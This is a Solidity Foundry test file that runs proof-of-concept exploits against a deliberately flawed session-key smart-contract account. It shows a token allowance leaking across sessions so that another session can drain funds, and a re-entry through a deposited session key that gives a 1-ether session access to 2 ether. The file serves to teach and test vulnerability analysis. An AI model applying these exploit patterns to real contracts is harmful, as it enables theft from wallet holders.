// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {
    BadSessionAccount,
    ExistingSession,
    InsufficientAllowance,
    Unauthorized,
    UnauthorizedDestination
} from "../src/BadSessionAccount.sol";
import { ShadowERC } from 'test/ShadowERC.sol';
import { Puller } from 'test/Puller.sol';

import "openzeppelin-contracts/contracts/token/ERC1155/IERC1155.sol";
import "openzeppelin-contracts/contracts/token/ERC1155/utils/ERC1155Holder.sol";
import "openzeppelin-contracts/contracts/utils/structs/EnumerableSet.sol";
using EnumerableSet for EnumerableSet.AddressSet;

contract VulnerabilityTests is Test, ERC1155Holder {
    BadSessionAccount public account;
    ShadowERC public erc20; 
    Puller public puller;

    string public constant mnemonic = "test test test test test test test test test test test junk"; 

    address public second;

    address[] public emptyDestinations;
    EnumerableSet.AddressSet private destinations;
    EnumerableSet.AddressSet private onlyERC20;

    receive() external payable { 
        // needed to be able to take money
    }

    function setUp() public {
        // create the account
        account = new BadSessionAccount();
      
        // create the tokens
        erc20 = new ShadowERC('Link', 'LINK');
        erc20.spawn(1 ether);
        
        // generate the "uniswap" puller
        puller = new Puller(address(erc20));

        // prepare a second operator in case we need to prank
        second = vm.addr(vm.deriveKey(mnemonic, 0));

        // fund this test, and the account
        vm.deal(address(this), 10 ether);
        (bool success,) = address(account).call{value: 1 ether}("");
        assert(success);

        // generate some test data
        destinations.add(address(puller));
        onlyERC20.add(address(erc20));
    }

    function test_AllowanceLeaksAcrossSessions() public {
        // fund the account
        erc20.transfer(address(account), 1 ether);
        assertEq(erc20.balanceOf(second), 0 ether);
        assertEq(erc20.balanceOf(address(account)), 1 ether);

        // create session 1, which can access it
        account.createKey(1, address(this));
        account.createSession(1, onlyERC20.values(), 0);

        // create session 2, which can only access a single external contract
        account.createKey(2, address(this));
        account.createSession(2, destinations.values(), 0);

        // demonstrate that contract fails as it should, by trying to use
        // the puller even though there won't be an allowance on the account
        vm.expectRevert();
        account.execute(2, address(puller), 0, abi.encodeWithSelector(puller.pull.selector));
        assertEq(erc20.balanceOf(address(account)), 1 ether);

        // use session 1 to set an allowance that leaks outside the session.
        // This simulates a session setting a token approval for something like uniswap.
        // This user has "access" to this ERC20. It's entirely possible a user could
        // set the approval to "infinite" as well. In either case, this allowance
        // is going to immmediately leak across sessions for the entire account.
        account.execute(1, address(erc20), 0,
            abi.encodeWithSelector(erc20.approve.selector, address(puller), 1 ether));

        // demonstrate that the contract doesn't fail, and the funds could
        // be utilized even though the session isn't configured for it
        // If the account session model was secure, this would FAIL, as the session
        // shouldn't have access to utilize that ERC20, but will because of state left
        // over from other sessions
        account.execute(2, address(puller), 0, abi.encodeWithSelector(puller.pull.selector));
        assertEq(erc20.balanceOf(address(account)), 0 ether);
        assertEq(erc20.balanceOf(address(puller)), 1 ether);
    }

    function test_StoringSessionsInAccountCausesPrivilegeEscalation() public {
        // fund the account with more ether 
        (bool success,) = address(account).call{value: 1 ether}("");
        assert(success);
        assertEq(address(account).balance, 2 ether);

        // create session 1, which can access 2 ether 
        account.createKey(1, address(this));
        account.createSession(1, emptyDestinations, 2 ether);

        // create a session with just 1 ether allowance
        account.createKey(2, address(this));
        account.createSession(2, emptyDestinations, 1 ether);
    
        // deposit the original 2 ether session key into the account
        //
        // This demonstrates that the session model has serious design flaws, but wouldn't
        // be immediately apparent within the code itself, as no obvious tx.origin,
        // or re-entrancy bugs exist. It's also hard to notice because the previous
        // test suites seemingly test the functionality fully, with edge cases and full
        // code coverage. This clearly outlines the importance of understanding state
        // when acknowledging or looking for vulnerabilities.
        //
        // After the account holds the session 2 key, any caller will be able to execute
        // their instructions as the session 1 holder. Even though Session 2 was properly
        // configured when it was created, the vulnerability opened up once the session 1
        // key was added to the account.
        account.safeTransferFrom(address(this), address(account), 1, 1, '');
        assertEq(account.balanceOf(address(account), 1), 1);

        // use the "1 ether only" session to re-enter the contract,
        // using privilege escalation to use 2 ether, instead of the
        // intended 1 ether.
        account.execute(2, address(account), 0,
                abi.encodeWithSelector(account.execute.selector, 1, second, 2 ether, ''));

        // assert that the 2 ether moved
        assertEq(address(account).balance, 0 ether);
        assertEq(second.balance, 2 ether);
    }
}
